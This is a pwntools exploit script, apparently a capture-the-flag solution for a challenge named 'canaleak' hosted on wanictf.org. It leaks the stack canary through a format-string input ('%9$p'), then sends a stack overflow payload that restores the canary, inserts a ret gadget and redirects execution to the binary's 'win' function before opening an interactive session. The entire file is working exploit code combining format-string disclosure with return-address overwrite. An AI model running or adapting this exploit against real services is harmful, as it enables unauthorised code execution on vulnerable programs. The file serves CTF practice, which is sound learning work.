from pwn import *

HOST = "canaleak-pwn.wanictf.org"
PORT = 9006
file = "./chall"
e = ELF(file)
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
init-bef
b *main+128
'''

#io = gdb.debug(file, command)
#io = process(file)
io = remote(HOST, PORT)

rop_ret = 0x0040101a

io.sendlineafter(b": ", b"%9$p")
canary = int(io.recvline()[:-1], 16)
io.debug(f"canary: {canary}")
io.sendlineafter(b": ", p64(0)*3+p64(canary)*2+p64(rop_ret)+p64(e.sym["win"]))
io.sendlineafter(b": ", b"YES")
io.interactive()
